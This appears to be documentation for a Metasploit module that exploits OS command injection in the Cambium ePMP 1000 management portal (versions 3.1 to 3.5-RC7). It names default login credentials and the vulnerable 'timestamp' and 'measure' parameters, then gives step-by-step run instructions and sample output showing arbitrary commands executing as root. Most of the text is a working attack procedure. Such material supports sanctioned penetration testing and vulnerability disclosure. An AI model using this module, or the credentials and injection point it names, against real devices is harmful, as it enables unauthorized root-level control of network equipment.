This module exploits an OS Command Injection vulnerability in Cambium ePMP 1000 (v3.1-3.5-RC7) device management portal. It requires any one of the following login credentials - admin/admin, installer/installer, home/home - to execute arbitrary system commands. This module injects the payload in 'timestamp' parameter. Alternatively, a second, vulnerable parameter 'measure' can also be used.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/epmp1000_get_chart_cmd_exec```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```set CMD [COMMAND]```
5. Do: ```run```

## Sample Output

  ```
msf > use auxiliary/scanner/http/epmp1000_get_chart_cmd_exec
msf auxiliary(epmp1000_get_chart_cmd_exec) > set rhosts 1.3.3.7
msf auxiliary(epmp1000_get_chart_cmd_exec) > set rport 80
msf auxiliary(epmp1000_get_chart_cmd_exec) > set CMD id; pwd
msf auxiliary(epmp1000_get_chart_cmd_exec) > run

[+] 1.3.3.7:80 - Running Cambium ePMP 1000 version 3.5...
[*] 1.3.3.7:80 - Attempting to login...
[+] SUCCESSFUL LOGIN - 1.3.3.7:80 - "installer":"installer"
[*] 1.3.3.7:80 - Executing id; pwd
uid=0(root) gid=0(root)
/
[*] 1.3.3.7:80 - File saved in: /root/.msf4/loot/20000000000003_default_1.3.3.7_ePMP_cmd_exec_12345.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

  ```
